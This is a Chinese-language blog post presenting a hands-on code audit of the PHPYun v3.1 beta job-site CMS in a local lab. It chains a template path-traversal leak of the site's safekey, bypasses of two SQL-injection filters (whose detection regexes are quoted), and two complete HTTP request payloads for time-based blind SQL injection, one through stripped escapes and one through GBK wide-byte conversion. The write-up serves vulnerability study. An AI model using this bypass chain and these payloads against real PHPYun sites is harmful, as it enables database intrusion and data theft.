<!DOCTYPE html>
<html lang="zh-CN">
    
    <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
    <meta name="description" content="phpyun v3.1 beta代码审计练习" />
    <meta name="hexo-theme-A4" content="v1.8.2" />
    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
    <title>v2ish1yan</title>

    
        
<link rel="stylesheet" href="/css/a11y-dark.min.css">

        
<link rel="stylesheet" href="/css/reset.css">

        
<link rel="stylesheet" href="/css/markdown.css">

        
<link rel="stylesheet" href="/css/fonts.css">
 
         <!--注意：首页既不是post也不是page-->
        
            
<link rel="stylesheet" href="/css/waline.css">

        
        
        
<link rel="stylesheet" href="/css/ui.css">
 
        
<link rel="stylesheet" href="/css/style.css">


        
            <!--返回顶部css-->
            
<link rel="stylesheet" href="/css/returnToTop.css">

            
<link rel="stylesheet" href="/css/unicons.css">

        
        
            <!--目录-->
            
<link rel="stylesheet" href="/css/toc.css">

        
    
    

<meta name="generator" content="Hexo 6.3.0"></head>
    
    <style>
        :root {
            --waline-theme-color: #000000; 
            --waline-color: #000000; 
            --waline-border-color: #000000; 
            --waline-white: #000000; 
            --waline-bgcolor-light: #ffffff;  
        }
        body {
            color: #000000;
            background: #e4e4e4;
        }
        .post-md code {
            background: #212425;
            color: white; 
        }
        .year-font-color {
            color: #000000 !important;
        }
        .wl-card span.wl-nick {
            color: #000000; 
        }
        .wl-card .wl-badge {
            border: 1px solid #000000;
            color: #000000; 
        }
        .wl-btn {
            border: 1px solid #000000; 
            color:  #000000;  
        }
        .wl-btn.primary {
            color: #ffffff; 
        }
        .wl-header label {
            color: #000000;
        }
        a {
            color: rgb(239, 112, 96);
        }

        .post-md a {
            color: rgb(239, 112, 96);
        }

        .nav li a {
            color: rgb(239, 112, 96);
        }

        .archive-main a:link {
            color: rgb(239, 112, 96);
        }
        .archive-main a:visited {
            color: rgb(239, 112, 96); 
        }

        .archive li span {
            color: #000000;
        }

        .post-main-title {
            color: #000000;
        }

        .post-md h1,
        .post-md h2,
        .post-md h3,
        .post-md h4,
        .post-md h5,
        .post-md h6 {
            color: #000000;
        }

        [data-waline] p {
            color: #000000;
        }
        [data-waline] a {
            color: #000000;
        } 
        .wl-sort li.active {
            color: #000000;
        }

        .wl-card .wl-meta>span {
            background: #ffffff;
        }

        .paper {
            background: #e4e4e4;
        }

        .index-main {
            background: #ffffff;
        }

        .paper-main {
            background: #ffffff;
        }

        .wl-panel {
            background: #ffffff;
        }

        .archive li:nth-child(odd) {
            background: #ffffff;
            ;
        }

        .archive li:nth-child(even) {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(odd) td {
            background: #ffffff;
        }

        .post-md>table tr:nth-child(even) td {
            background: #ffffff;
        }

    
        .progress-wrap::after {
            color: #000000; /* 箭头的颜色 */
        }
        .progress-wrap svg.progress-circle path {
	        stroke: #000000; /* 边框的颜色 */
        }
        .progress-wrap::before {
	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
         }

         .left-toc-container::-webkit-scrollbar-thumb {
            background-color: #000000; /* 设置滚动条拖动块的颜色 */
        }

        .bs-docs-sidebar .nav>.active>a,
        .bs-docs-sidebar .nav>li>a:hover,
        .bs-docs-sidebar .nav>li>a:focus {
            color: rgb(239, 112, 96);
            border-left-color: rgb(239, 112, 96);
        }
        .bs-docs-sidebar .nav>li>a {
            color:  #000000;
        }
    </style>

    
    <body>
        
            <div class="left-toc-container">
                <nav id="toc" class="bs-docs-sidebar"></nav>
            </div>
        
        <div class="paper">
            
            
            
            
                <div class="shadow-drop-2-bottom paper-main">
                    
<div class="header">
    <div class="header-container">
        <img style="
        width: 56px;
        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
        <div class="header-content">
            <a class="logo" href="/">v2ish1yan</a> 
            <span class="description">一切都是兴趣使然</span> 
        </div>
        
    </div>
    
   
    <ul class="nav">
        
            
                <li><a href="/">首页</a></li>
            
        
            
                <li><a href="/list/">文章</a></li>
            
        
            
                <li><a href="/tags/">标签</a></li>
            
        
            
                <li><a href="/categories/">分类</a></li>
            
        
            
                <li><a href="/about/">关于</a></li>
            
        
            
                <li><a href="/friends/">友链</a></li>
            
        
    </ul>
</div> 
        
                    
                    

                    
                    
                    
                    <!--说明是文章post页面-->
                    
                        <div class="post-main">

    
        <div class="post-main-title">
            phpyun v3.1 beta代码审计练习
        </div>
      
    

    <div class="post-md">
        
            
                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90"><span class="post-toc-text">路由分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#waf-1"><span class="post-toc-text">waf 1</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#waf-2"><span class="post-toc-text">waf 2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="post-toc-text">sql注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%B3%A8%E5%85%A5%E4%B8%80"><span class="post-toc-text">注入一</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BA%8C"><span class="post-toc-text">注入二</span></a></li></ol></li></ol>
            
        
        <blockquote>
<p>phpyunv3.1 beta</p>
<p>绕sql防御，宽字节注入</p>
<p>iconv(“utf-8”,”gbk”,$s)对character_set_client&#x3D;binary和影响</p>
</blockquote>
<h2 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h2><pre><code class="php">&lt;?php
/* *
* $Author ：PHPYUN开发团队
*
* 官网: http://www.phpyun.com
*
* 版权所有 2009-2014 宿迁鑫潮信息技术有限公司，并保留所有权利。
*
* 软件声明：未经授权前提下，不得用于商业运营、二次开发以及任何形式的再次发布。
*/
include(dirname(__FILE__).&quot;/global.php&quot;);
if($config[&#39;webcache&#39;]==&quot;1&quot;)&#123;
    include_once(LIB_PATH.&quot;web.cache.php&quot;);
    $cache=new Phpyun_Cache(&#39;./cache&#39;,dirname(__FILE__).&quot;/&quot;,$config[&#39;webcachetime&#39;]);
    $cache-&gt;read_cache();
&#125;
$var=@explode(&#39;-&#39;,str_replace(&#39;/&#39;,&#39;-&#39;,$_GET[&#39;yunurl&#39;]));
foreach($var as $p)&#123;
    $param=@explode(&#39;_&#39;,$p);
    $_GET[$param[0]]=$param[1];
&#125;
unset($_GET[&#39;yunurl&#39;]);
if($_GET[&#39;m&#39;] &amp;&amp; !ereg(&quot;^[0-9a-zA-Z\_]*$&quot;,$_GET[&#39;m&#39;]))&#123;
    
    $_GET[&#39;m&#39;] = &#39;index&#39;;
&#125;
$model = $_GET[&#39;m&#39;];
$action = $_GET[&#39;c&#39;];
if($model==&quot;&quot;)	$model=&quot;index&quot;;
if($action==&quot;&quot;)	$action = &quot;index&quot;;
if(!is_file(MODEL_PATH.$model.&#39;.class.php&#39;))&#123;
    $controller=&#39;index&#39;;
    $action=&#39;index&#39;;
&#125;
require(MODEL_PATH.&#39;class/common.php&#39;);
require(&quot;model/&quot;.$model.&#39;.class.php&#39;);
$conclass=$model.&#39;_controller&#39;;
$actfunc=$action.&#39;_action&#39;;
$views=new $conclass($phpyun,$db,$db_config[&quot;def&quot;],&quot;index&quot;,$model);
if(!method_exists($views,$actfunc))&#123;
    $views-&gt;DoException();
&#125;
$views-&gt;$actfunc();
if($config[&#39;webcache&#39;]==&quot;1&quot;)&#123;
    $cache-&gt;CacheCreate();
&#125;
?&gt;
</code></pre>
<p>这里的路由还是比较简单，都是从这里当做入口</p>
<p>取m的值作为要实例化的类，c作为需要调用的方法</p>
<p>url例子：<code>http://192.168.91.39:8082/index.php?m=com&amp;c=search&amp;job1=35</code></p>
<h2 id="waf-1"><a href="#waf-1" class="headerlink" title="waf 1"></a>waf 1</h2><p>在包含的<code>global.php</code>文件里，引入了<code>db.safety.php</code>和<code>webscan360/360safe/360webscan.php</code>两个sql注入waf</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401161834365.png" alt="image-20240116183438291"></p>
<p><code>global.php</code></p>
<pre><code class="php">if($config[&#39;sy_istemplate&#39;]!=&#39;1&#39; || md5(md5($config[&#39;sy_safekey&#39;]).$_GET[&#39;m&#39;])!=$_POST[&#39;safekey&#39;])
&#123;
    foreach($_POST  as $id=&gt;$v)&#123;
        safesql($id,$v,&quot;POST&quot;,$config);
        $id = sfkeyword($id,$config);
        $v = sfkeyword($v,$config);
        $_POST[$id]=common_htmlspecialchars($v);
    &#125;
&#125;
</code></pre>
<p>这里对sql注入进行防御的函数为<code>safesql</code></p>
<pre><code class="php">function safesql($StrFiltKey,$StrFiltValue,$type)&#123;
    
     $getfilter = &quot;\\&lt;.+javascript:window\\[.&#123;1&#125;\\\\x|&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*(data|src)=data:text\\/html.*&gt;|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\\(\d+?|sleep\s*?\\([\d\.]+?\\)|load_file\s*?\\()|&lt;[a-z]+?\\b[^&gt;]*?\\bon([a-z]&#123;4,&#125;)\s*?=|^\\+\\/v(8|9)|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&quot;\\d]+?=[\\(\\)&#39;\&quot;\\d]+?|[\\(\\)&#39;\&quot;a-zA-Z]+?=[\\(\\)&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\/\\*.+?\\*\\/|\\/\\*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;

    $postfilter = &quot;&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*data=data:text\\/html.*&gt;|\\b(alert\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\\(\d+?|sleep\s*?\\([\d\.]+?\\)|load_file\s*?\\()|&lt;[^&gt;]*?\\b(onerror|onmousemove|onload|onclick|onmouseover)\\b|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&quot;\\d]+?=[\\(\\)&#39;\&quot;\\d]+?|[\\(\\)&#39;\&quot;a-zA-Z]+?=[\\(\\)&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\/\\*.+?\\*\\/|\\/\\*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;

    $cookiefilter = &quot;benchmark\s*?\\(\d+?|sleep\s*?\\([\d\.]+?\\)|load_file\s*?\\(|\\b(and|or)\\b\\s*?([\\(\\)&#39;\&quot;\\d]+?=[\\(\\)&#39;\&quot;\\d]+?|[\\(\\)&#39;\&quot;a-zA-Z]+?=[\\(\\)&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\/\\*.+?\\*\\/|\\/\\*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;
    
    if($type==&quot;GET&quot;)
    &#123;
        $ArrFiltReq = $getfilter;

    &#125;elseif($type==&quot;POST&quot;)&#123;
        
        $ArrFiltReq = $postfilter;
    
    &#125;elseif($type==&quot;COOKIE&quot;)&#123;

        $ArrFiltReq = $cookiefilter;
    &#125;
    if(is_array($StrFiltValue))
    &#123;
        foreach($StrFiltValue as $key=&gt;$value)
        &#123;
            safesql($key,$value,$type);
        &#125;
    &#125;else&#123;
        if (preg_match(&quot;/&quot;.$ArrFiltReq.&quot;/is&quot;,html_entity_decode($StrFiltValue,ENT_NOQUOTES,&quot;GB2312&quot;))==1)
        &#123;
             exit(safe_pape());
        &#125;
    &#125;
    if (preg_match(&quot;/&quot;.$ArrFiltReq.&quot;/is&quot;,$StrFiltKey)==1)
    &#123;
         exit(safe_pape());
    &#125;
&#125;
</code></pre>
<p>只要不进入这个if语句，就能绕过这个waf，然后再POST传参里进行sql注入</p>
<pre><code class="php">if($config[&#39;sy_istemplate&#39;]!=&#39;1&#39; || md5(md5($config[&#39;sy_safekey&#39;]).$_GET[&#39;m&#39;])!=$_POST[&#39;safekey&#39;])
</code></pre>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162007991.png" alt="image-20240116200738950"></p>
<p>这里<code>$config[&#39;sy_istemplate&#39;]</code>的值为1，是config里定义的，不可控的</p>
<p>所以只要满足<code>md5(md5($config[&#39;sy_safekey&#39;]).$_GET[&#39;m&#39;])==$_POST[&#39;safekey&#39;]</code>即可</p>
<p><code>$config[&#39;sy_safekey&#39;]</code>的值是在安装的时候随机生成的字符串，所以也是不可控的。现在的任务就是如何从用户层面获得这个值。</p>
<p>全局搜索，发现除了在<code>plus/config.php</code>文件中存在，还可以通过模板渲染出来</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162011435.png" alt="image-20240116201110232"></p>
<p>这套代码用了smarty作为模板渲染引擎</p>
<p>在<code>global.php</code>里会创建smarty对象，并进行初始化操作</p>
<pre><code class="php">$phpyun = new smarty();
$phpyun-&gt;template_dir = APP_PATH.&#39;/template/&#39;;
$phpyun-&gt;compile_dir  = APP_PATH.&#39;/templates_c/&#39;;
$phpyun-&gt;cache_dir    = APP_PATH.&#39;/cache/&#39;;
$phpyun-&gt;left_delimiter = &quot;&#123;yun:&#125;&quot;;
$phpyun-&gt;right_delimiter = &quot;&#123;/yun&#125;&quot;;
</code></pre>
<p>smarty比较常用的几个方法</p>
<pre><code class="php">smarty()-&gt;assign($tpl_var, $value = null)//给变量名绑定值
smarty()-&gt;display($resource_name, $cache_id = null, $compile_id = null)//渲染特定的文件，并将值打印出来
</code></pre>
<p>在<code>index.php</code></p>
<pre><code class="php">require(MODEL_PATH.&#39;class/common.php&#39;);
require(&quot;model/&quot;.$model.&#39;.class.php&#39;);
$conclass=$model.&#39;_controller&#39;;
$actfunc=$action.&#39;_action&#39;;
$views=new $conclass($phpyun,$db,$db_config[&quot;def&quot;],&quot;index&quot;,$model);
</code></pre>
<p>这里的<code>$model.&#39;_controller&#39;</code>类大多数是继承了common类，所以在实例化的时候，都会先执行common类里的common函数</p>
<p>在<code>common::common($tpl,$db,$def=&quot;&quot;,$model=&quot;index&quot;,$m=&quot;&quot;)</code>里，就有对smarty对象进行操作</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162028775.png" alt="image-20240116202850617"></p>
<p>跟进yunset，他就是进行变量绑定的操作</p>
<pre><code class="php">function yunset($name,$value)&#123;

    $this-&gt;tpl-&gt;assign($name,$value);
&#125;
</code></pre>
<p>所以在common里，config的值是已经被赋予了smarty模板里的变量的</p>
<p>只要再找到一个可以控制smarty渲染的目标模板文件为我们上面找到的<code>template/admin/admin_web_config.htm</code></p>
<p>这样就能获得<code>$config[&#39;sy_safekey&#39;]</code>的值</p>
<p>在common类里有两个函数可以进行display的操作</p>
<pre><code class="php">function yuntpl($tplarr=array())&#123;
    if(is_array($tplarr) &amp;&amp; $tplarr!=&#39;&#39;)&#123;
        foreach($tplarr as $v)&#123;
            $this-&gt;tpl-&gt;display($v.&quot;.htm&quot;);
        &#125;
    &#125;else&#123;
        echo &quot;模版不能为空！&quot;;die;
    &#125;
&#125;

function yun_tpl($tplarr=array())&#123;
    if(is_array($tplarr) &amp;&amp; $tplarr!=&#39;&#39;)&#123;
        foreach($tplarr as $v)&#123;
            $rand=mktime();
            $this-&gt;tpl-&gt;display($this-&gt;config[&#39;style&#39;].&quot;/&quot;.$this-&gt;m.&quot;/&quot;.$v.&quot;.htm&quot;);
        &#125;
    &#125;else&#123;
        echo &quot;模版不能为空！&quot;;die;
    &#125;
&#125;
</code></pre>
<p>只要找到会调用yuntpl或者yun_tpl的类，并且渲染的文件可控</p>
<p>最后找到<code>company/model/index.class.php</code>，在他的<code>index_action()</code>函数最后</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162036860.png" alt="image-20240116203636703"></p>
<pre><code class="php">$tp=$_GET[&#39;tp&#39;]?$_GET[&#39;tp&#39;]:&quot;index&quot;;
$this-&gt;seo(&quot;company_&quot;.$tp);
$this-&gt;yunset(&quot;com_style&quot;,$this-&gt;config[&#39;sy_weburl&#39;].&quot;/template/company/&quot;.$tplurl.&quot;/&quot;);
$this-&gt;yunset(&quot;comstyle&quot;,&quot;../template/company/&quot;.$tplurl.&quot;/&quot;);
$this-&gt;yunset(&quot;defaultstyle&quot;,&quot;../template/default/&quot;);
$this-&gt;yuntpl(array(&#39;company/&#39;.$tplurl.&quot;/&quot;.$tp));
</code></pre>
<p>渲染的文件是可以控制的</p>
<p>同时还要注意前面，必选要存在企业，才可以走到这一步</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162041729.png" alt="image-20240116204111676"></p>
<p>手动添加一个企业即可</p>
<p>所以我们只需要访问以下url，就可以获得<code>$config[&#39;sy_safekey&#39;]</code>的值</p>
<p><code>http://192.168.91.39:8082/company/index.php?m=index&amp;c=index&amp;tp=../../admin/admin_web_config&amp;id=1</code></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162044513.png" alt="image-20240116204425428"></p>
<p>得到<code>$config[&#39;sy_safekey&#39;]</code>的值后就可以绕过第一个waf了</p>
<h2 id="waf-2"><a href="#waf-2" class="headerlink" title="waf 2"></a>waf 2</h2><p>在经过第一个waf后，还有<code>include/webscan360/360safe/360webscan.php</code>里的</p>
<pre><code class="php">if ($webscan_switch&amp;&amp;webscan_white($webscan_white_directory,$webscan_white_url)) &#123;
    
  if ($webscan_get) &#123;

    foreach($_GET as $key=&gt;$value) &#123;
      webscan_StopAttack($key,$value,$getfilter,&quot;GET&quot;);
    &#125;
  &#125;
  if ($webscan_post) &#123;
    foreach($_POST as $key=&gt;$value) &#123;
      webscan_StopAttack($key,$value,$postfilter,&quot;POST&quot;);
    &#125;
  &#125;
  if ($webscan_cookie) &#123;
    foreach($_COOKIE as $key=&gt;$value) &#123;
      webscan_StopAttack($key,$value,$cookiefilter,&quot;COOKIE&quot;);
    &#125;
  &#125;
  if ($webscan_referre) &#123;
    foreach($webscan_referer as $key=&gt;$value) &#123;
      webscan_StopAttack($key,$value,$postfilter,&quot;REFERRER&quot;);
    &#125;
  &#125;
&#125;
</code></pre>
<p>同样的思路，不仅这个if语句就可以绕过</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162050381.png" alt="image-20240116205027303"></p>
<p><code>$webscan_switch</code>固定为1，需要让<code>webscan_white()</code>返回为false</p>
<p><code>$webscan_white_directory</code>的值为<code>admin|\/dede\/|\/install\/</code></p>
<p><code>$webscan_white_url</code>是一个数组，值为</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162057038.png" alt="image-20240116205716910"></p>
<p>跟进webscan_white</p>
<pre><code class="php">function webscan_white($webscan_white_name,$webscan_white_url=array()) &#123;
  $url_path=$_SERVER[&#39;PHP_SELF&#39;];
  $url_var=$_SERVER[&#39;QUERY_STRING&#39;];
  if (preg_match(&quot;/&quot;.$webscan_white_name.&quot;/is&quot;,$url_path)==1) &#123;
    return false;
  &#125;
  foreach ($webscan_white_url as $key =&gt; $value) &#123;
    if(!empty($url_var)&amp;&amp;!empty($value))&#123;
      if (stristr($url_path,$key)&amp;&amp;stristr($url_var,$value)) &#123;
        return false;
      &#125;
    &#125;
    elseif (empty($url_var)&amp;&amp;empty($value)) &#123;
      if (stristr($url_path,$key)) &#123;
        return false;
      &#125;
    &#125;

  &#125;

  return true;
&#125;
</code></pre>
<p>这里比较简单，只需要满足<code>stristr($url_path,$key)&amp;&amp;stristr($url_var,$value)</code>即可</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162055563.png" alt="image-20240116205540490"></p>
<p>这里的<code>$url_path</code>和<code>$url_var</code>都是我们可以控制的</p>
<p>让<code>$url_path</code>里有<code>index.php</code>，这个很好满足，因为都是从这里开始的</p>
<p>让<code>$url_var</code>里有<code>admin_dir=admin</code>，这个也很简单，这个参数不会影响我函数的执行</p>
<p>所以绕这个waf的url为</p>
<p><code>http://192.168.91.39:8082/company/index.php?admin_dir=admin&amp;sql=xxxx</code></p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>这里有俩个点，一个是作者的傻逼操作导致的注入，另一个是因为对mysql的配置进行的宽字节注入</p>
<h3 id="注入一"><a href="#注入一" class="headerlink" title="注入一"></a>注入一</h3><p><code>db.safety.php</code>里的<code>quotesGPC();</code>会将输入进行<code>addslashes()</code>操作，就是对符号添加转义字符</p>
<pre><code class="php">function quotesGPC() &#123;

    if(!get_magic_quotes_gpc())&#123;
     	$_POST = array_map(&quot;addSlash&quot;, $_POST);
        $_GET = array_map(&quot;addSlash&quot;, $_GET);
        $_COOKIE = array_map(&quot;addSlash&quot;, $_COOKIE);
    &#125;

&#125;
function addSlash($el) &#123;
    if (is_array($el))
        return array_map(&quot;addSlash&quot;, $el);
    else
        return addslashes($el);
&#125;
</code></pre>
<p>在手机版的登录函数里，作者做了一个非常奇怪的操作</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162115352.png" alt="image-20240116211542261"></p>
<p><code>wap/model/login.class.php</code></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162117202.png" alt="image-20240116211705046"></p>
<pre><code class="php">$username = str_replace(&#39;\\&#39;,&#39;&#39;,$_POST[&#39;username&#39;]);
......
$userinfo = $this-&gt;obj-&gt;DB_select_once(&quot;member&quot;,&quot;`username`=&#39;&quot;.str_replace(&#39;\\&#39;,&#39;&#39;,$_POST[&#39;username&#39;]).&quot;&#39; and usertype=&#39;&quot;.$usertype.&quot;&#39;&quot;,&quot;username,usertype,password,uid,salt&quot;);
</code></pre>
<p>他自己把转义符号<code>\</code>给去掉了，真离谱</p>
<p>所以这里的注入payload</p>
<pre><code>POST /wap/index.php?m=login&amp;c=index&amp;admin_dir=admin HTTP/1.1
Host: 192.168.91.39:8082
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: hThbk_admin_username=01946cSxjfHr5n5deaN2nq32aGPrlmwAvaC2yi3pY2YeBv8; hThbk_siteid=88f0h61ZI_oE2e35AlzIvqjdF9QDVw-64QWwFTDq; hThbk_userid=2f2bCsjotgEM32BCtAjD33IuWF9gwm3_uezNYBvp; hThbk_admin_email=50f5wvAnIMP0PXQ-AK_cWNvFpce1ZQcyuy5C6C_VfFYAEaRmSg; hThbk_sys_lang=8f14-tIiEZwLVjUjYdasxVAqYJoQsqXkzqpsn9V8TmJhtA; ashell=c0e024d9200b5705bc4804722636378a; PHPSESSID=6g8jlrfbo9jjag6oin96hmo4m4; XDEBUG_SESSION=PHPSTORM
Connection: close
Content-Length: 86
Content-Type: application/x-www-form-urlencoded

submit=1&amp;username=1&#39;+or+sleep(10)%23&amp;safekey=89ebd0767990c2f70f01c1ea0d558d81
</code></pre>
<p>即可进行sql盲注，然后交给sqlmap就行</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162133490.png" alt="image-20240116213342396"></p>
<h3 id="注入二"><a href="#注入二" class="headerlink" title="注入二"></a>注入二</h3><p>审这里的时候就收获大大滴，原理可以看p牛的<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html">https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html</a></p>
<p>在连接数据库的时候会进行以下操作</p>
<pre><code class="php">$this-&gt;coding=&quot;gbk&quot;;
@mysql_query(&quot;SET NAMES $this-&gt;coding&quot;);
@mysql_query(&quot;SET character_set_connection=gbk,character_set_results=gbk,character_set_client=binary&quot;, $this-&gt;conn); 
</code></pre>
<p>这里进行了<code>character_set_client=binary</code>操作</p>
<p>这里的意思就是，在数据进入数据库的时候，mysql不会把数据视为字节流，而是视为单个字节</p>
<p>即在gbk编码下，不会把<code>\xdf5c</code>识别为中文字符<code>運</code>，而是识别为<code>0xdf</code>和<code>0x5c</code>的ascii码</p>
<p>所以一般情况下，这里是不会存在宽字节注入的，但是！</p>
<p>有一个非常危险的操作，即<code>iconv(&quot;utf-8&quot;,&quot;gbk&quot;,$s)</code></p>
<p>会把字符从utf-8编码转换为gbk编码，大多数是为了防止乱码的出现，但是却造成了一个sql注入漏洞</p>
<p>比如，将一个中文字符从utf-8转为gbk编码后，他的16机制为<code>xx5c</code>，同时反斜杠<code>\</code>的ascii码的16进制也为<code>5c</code></p>
<p>并且msql以binary的格式读取这两个数据，那么就会读成<code>xx5c5c</code>，也就会有两个<code>\</code>，从而把反斜杠<code>\</code>转义掉，造成单引号<code>&#39;</code>逃逸</p>
<p>在登录时，会进入路由<code>/index.php?m=login&amp;c=loginsave</code></p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162209669.png" alt="image-20240116220957542"></p>
<p>这个函数有以下操作</p>
<pre><code class="php">$username=iconv(&quot;utf-8&quot;,&quot;gbk&quot;,$_POST[&#39;username&#39;]);
...
$user = $this-&gt;obj-&gt;DB_select_once(&quot;member&quot;,&quot;`username`=&#39;&quot;.$username.&quot;&#39;&quot;,&quot;`pw_repeat`,`pwuid`,`uid`,`username`,`salt`,`email`,`password`,`usertype`,`status`,`email_status`&quot;);
</code></pre>
<p>最后会执行以下sql语句</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162214882.png" alt="image-20240116221437742"></p>
<pre><code class="sql">SELECT `pw_repeat`,`pwuid`,`uid`,`username`,`salt`,`email`,`password`,`usertype`,`status`,`email_status` FROM phpyun_member WHERE `username`=&#39;1234567&#39; limit 1
</code></pre>
<p>这里的username我们是可控的，可以根据上面的原理进行时间盲注</p>
<p>可能是我虚拟机的问题，时间一长网站就遭不住，所以时间得弄短一点</p>
<p>payload</p>
<pre><code>POST /index.php?m=login&amp;c=loginsave&amp;admin_dir=admin HTTP/1.1
Host: 192.168.91.39:8082
Content-Length: 67
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.91.39:8082
Referer: http://192.168.91.39:8082/index.php?m=login&amp;usertype=2
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: hThbk_admin_username=01946cSxjfHr5n5deaN2nq32aGPrlmwAvaC2yi3pY2YeBv8; hThbk_siteid=88f0h61ZI_oE2e35AlzIvqjdF9QDVw-64QWwFTDq; hThbk_userid=2f2bCsjotgEM32BCtAjD33IuWF9gwm3_uezNYBvp; hThbk_admin_email=50f5wvAnIMP0PXQ-AK_cWNvFpce1ZQcyuy5C6C_VfFYAEaRmSg; hThbk_sys_lang=8f14-tIiEZwLVjUjYdasxVAqYJoQsqXkzqpsn9V8TmJhtA; ashell=c0e024d9200b5705bc4804722636378a; PHPSESSID=6g8jlrfbo9jjag6oin96hmo4m4; XDEBUG_SESSION=PHPSTORM
Connection: close

username=錦&#39;+or+sleep(2)%23&amp;password=1234567&amp;usertype=2&amp;path=index&amp;loginname=1&amp;safekey=89ebd0767990c2f70f01c1ea0d558d81
</code></pre>
<p>这里的中文字符使用“錦”,其实只要是gbk编码后面以5c结尾即可，“猏”也可以</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162217473.png" alt="image-20240116221728297"></p>
<p>这里虽然显示的虽然没有两个<code>\</code>，但是后面到数据库就会了</p>
<p>明显的延时，然后丢给sqlmap就行了</p>
<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401162233404.png" alt="image-20240116223306296"></p>
